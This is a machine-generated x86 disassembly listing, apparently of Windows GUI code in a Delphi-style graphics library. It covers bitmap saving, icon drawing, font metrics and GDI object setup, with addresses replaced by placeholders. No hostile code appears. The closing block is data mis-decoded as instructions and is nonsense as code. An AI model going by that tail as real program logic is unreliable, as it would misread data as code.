mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_425924
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_426178
jmp r-xdata
push esp
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_426178
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_424ebc
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_426a74
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x20 ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_425f18
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x8 ] edi
mov [ esp + 0x20 ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_425924
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_426ac8
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_425f18
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax edi
call sub_425924
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_426b48
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_425f08
mov eax ebx
call sub_425f18
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_424ebc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_426bdf
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
mov al [ esi + 0x70 ]
push eax
push 0x0
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_426178
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_424db4
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_41f6dc
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_426be4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
call sub_403a9c
call sub_403af0
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_424db4
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_426c1c
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x1c ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_425f18
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] edi
mov [ esp + 0x1c ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_425924
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_426c78
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402cfc
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_425e94
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_4226a8
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_41954c
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_41954c
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402cfc
mov [ esp + 0x10 ] 0x4d42
mov eax esi
call sub_425d58
mov dl [ r-xdata ]
call sub_421540
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_421864
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
mov [ esp + 0x8 ] 0xc
mov ax [ ebp + 0x3e ]
cmp ax 0x8
ja r-xdata
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp + 0x18 ]
call sub_424e70
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_41954c
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_41954c
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
mov dx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
mov dx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
mov ax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_41954c
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_41954c
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp + 0x70 ]
xor ecx ecx
mov cl [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_41954c
mov edx [ ebp + 0x2c ]
mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_41954c
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_421cd4
cmp [ ebp + 0x70 ] 0x0
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_41954c
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_421ff8
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax [ esp + 0x4 ]
shl eax 0x2
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_426f30
push ebx
mov ebx eax
mov eax ebx
call sub_425f18
mov edx ebx
mov eax ebx
call sub_4259e4
mov eax [ ebx + 0x28 ]
mov edx [ eax + 0x8 ]
mov ecx edx
cmp edx [ eax + 0x14 ]
jne r-xdata
xor edx edx
mov [ eax + 0x8 ] edx
mov eax ecx
pop ebx
retn
xor edx edx
mov [ eax + 0x14 ] edx
xor edx edx
mov [ eax + 0x2c ] edx
sub_426f64
push ebx
mov ebx eax
mov eax ebx
call sub_425f18
mov edx ebx
mov eax ebx
call sub_4259e4
mov eax [ ebx + 0x28 ]
mov edx [ eax + 0x10 ]
xor ecx ecx
mov [ eax + 0x10 ] ecx
mov eax edx
pop ebx
retn
sub_426f90
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_425f18
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_424ebc
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_42700a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_425520
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_427030
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_4032e8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032d8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_427078
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4229e4
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_424ce8
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4270cc
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_424cec
mov edx ebx
and dl 0xfc
mov eax esi
call sub_417ae8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_4270fc
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_4273d4
mov edi ebx
mov eax [ edi + 0x28 ]
call sub_424ce8
mov eax [ esi + 0x28 ]
call sub_424cec
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_417b14
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_42715c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax esi
call sub_421540
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4271b4
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x4 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_4271f0
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_419308
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0xc ]
call sub_419514
mov ax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0x10 ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0xc ]
call sub_4222a4
jmp r-xdata
jmp r-xdata
call sub_421750
sub_427268
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4272f5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4271b4
cmp eax [ rw-data ]
jne r-xdata
call sub_421750
mov eax esi
call sub_4271b4
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_4227e8
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_402cfc
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41954c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_42731c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4273aa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_4192e8
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_419514
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_419514
mov ax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_4273d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_421750
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4273af
mov eax [ ebp - 0x4 ]
call sub_4032e8
call sub_403a9c
call sub_403af0
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4273d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_427414
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_424ce8
mov eax [ ebx + 0x28 ]
call sub_424cec
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_427494
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_427268
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0xc ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_41954c
pop esi
pop ebx
retn
sub_4274e4
push ebx
push 0x0
call GetDC
mov ebx eax
push 0x5a
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push ebx
push 0x0
call ReleaseDC
mov eax rw-data
mov edx 0xf
call sub_421da4
mov [ rw-data ] eax
pop ebx
retn
sub_42751c
push ebx
push esi
add esp 0xffffffc8
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x38
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
push esi
call GetTextMetricsA
test eax eax
je r-xdata
mov bl [ esp + 0x34 ]
sub_427560
push ebx
push esi
push edi
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call MulDiv
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_42751c
mov ebx eax
mov eax ebx
sub al 0x80
jne r-xdata
mov esi r-xdata
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x48
mov eax [ rw-data ]
push eax
push 0x9
call MulDiv
neg eax
mov [ rw-data ] eax
mov [ rw-data ] bl
sub_42762c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_427664
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax esi
call sub_42785c
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_4276a8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_427690
xor eax eax
push ebp
push sub_427749
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427750
mov eax [ ebp - 0x4 ]
call sub_42769c
retn
mov eax 0x10
call sub_40276c
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_42775c
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_42775c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_425790
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42783b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_425d58
mov edi eax
mov eax [ edi + 0x14 ]
xor edx edx
call sub_420d54
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_420c38
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_41613c
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_421010
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_421424
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_425a14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42785c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_427690
xor eax eax
push ebp
push sub_4278a7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4278ae
mov eax [ ebp - 0x4 ]
call sub_42769c
retn
mov esp ebp
pop ebp
retn
sub_4278ae
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_40278c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
call sub_4032e8
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_427690
xor eax eax
push ebp
push sub_4278a7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4278ae
mov eax [ ebp - 0x4 ]
call sub_42769c
retn
mov esp ebp
pop ebp
retn
sub_4278d4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_41ffac
push eax
mov eax ebx
call sub_41ffac
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_4276a8
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_42790c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4279d5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4279dc
retn
mov eax [ rw-data ]
call sub_4032e8
mov eax [ rw-data ]
call sub_4032e8
mov eax [ rw-data ]
call sub_4032e8
call sub_4249cc
mov eax [ rw-data ]
call sub_4032e8
mov eax [ rw-data ]
call sub_4032e8
mov eax [ rw-data ]
call sub_4032e8
mov eax [ rw-data ]
call sub_4032e8
mov eax [ rw-data ]
call sub_4032e8
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404ac0
mov eax rw-data
mov ecx 0x34
mov edx [ r-xdata ]
call sub_404ac0
sub_4279e0
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_4274e4
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconA
mov [ rw-data ] eax
call sub_427560
mov cx 0x2c
mov dl 0x1
mov eax [ sub_41f6f0 ]
call sub_41f764
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_41f6f0 ]
call sub_41f764
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_41f6f0 ]
call sub_41f764
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42762c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_417784
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_417784
mov [ rw-data ] eax
mov ecx sub_41ffbc
mov edx sub_41ffcc
mov eax [ sub_41e734 ]
call sub_416f38
mov ecx r-xdata
mov edx sub_4201d4
mov eax [ r-xdata ]
call sub_416f38
sub_427aec
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_427b11
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427b18
retn
sub_427b28
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ ebx + 0x42 ] 0x0
adc al 0x0
add [ eax ] al
or [ edx + 0x41 ] dl
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x73f40040 ] bl
inc ecx
add [ eax - 0x53ffbe8b ] bl
jl r-xdata
xor eax 0x353c0040
add [ eax + 0x74 ] cl
inc ecx
add ah al
je r-xdata
push esp
push ebx
je r-xdata
jb r-xdata
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x7d340040 ] bl
inc edx
add [ ebx + ebp ] ah
inc eax
add [ eax + 0x7d ] bh
inc edx
add [ ebp + edi * 2 + 0x42 ] ah
add [ esp + edx * 2 ] cl
dec edi
jb r-xdata
inc eax
xor eax 0x35440040
inc eax
add [ ebx ] cl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ecx * 2 + 0x69 ] si
jae r-xdata
cli
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
arpl [ ebx - 0x70 ] bp
dec esp
imul esi [ ebx + 0x74 ] 0x4000408d
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
jl r-xdata
fdivr [ ebx + 0x42 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
